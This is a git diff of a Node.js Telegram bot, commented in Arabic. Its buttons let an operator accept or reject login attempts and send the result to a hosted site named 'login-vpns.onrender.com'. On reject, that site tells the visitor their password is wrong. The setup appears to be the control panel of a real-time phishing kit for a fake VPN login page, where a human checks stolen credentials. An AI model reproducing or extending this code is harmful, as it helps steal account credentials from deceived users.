@@ -9,30 +9,27 @@ bot.on("polling_error", (error) => {
 });
 
 // عند الضغط على زر Accept أو Reject
-bot.on('callback_query', (callbackQuery) => {
+bot.on('callback_query', async (callbackQuery) => {
     const action = callbackQuery.data;
     const chatId = callbackQuery.message.chat.id;
 
     console.log('📥 تم الضغط على الزر:', action);
 
-    if (action === 'accept') {
-        fetch('http://localhost:3000/update-status?action=accept')
-            .then(res => res.text())
-            .then(() => {
-                console.log('✅ تم إرسال القبول إلى السيرفر');
-                bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول.');
-            })
-            .catch(err => console.error('❌ خطأ أثناء إرسال القبول:', err));
-    }
+    // رابط الموقع المرفوع على Render
+    const baseUrl = 'https://login-vpns.onrender.com';
 
-    if (action === 'reject') {
-        fetch('http://localhost:3000/update-status?action=reject')
-            .then(res => res.text())
-            .then(() => {
-                console.log('❌ تم إرسال الرفض إلى السيرفر');
-                bot.sendMessage(chatId, '❌ كلمة المرور غير صحيحة.');
-            })
-            .catch(err => console.error('❌ خطأ أثناء إرسال الرفض:', err));
+    try {
+        if (action === 'accept') {
+            await fetch(`${baseUrl}/update-status?action=accept`);
+            bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول. سيتم التوجيه...');
+        }
+
+        if (action === 'reject') {
+            await fetch(`${baseUrl}/update-status?action=reject`);
+            bot.sendMessage(chatId, '❌ كلمة المرور التي أدخلتها غير صحيحة.');
+        }
+    } catch (err) {
+        console.error('❌ خطأ أثناء المعالجة:', err);
     }
 
     bot.answerCallbackQuery(callbackQuery.id);
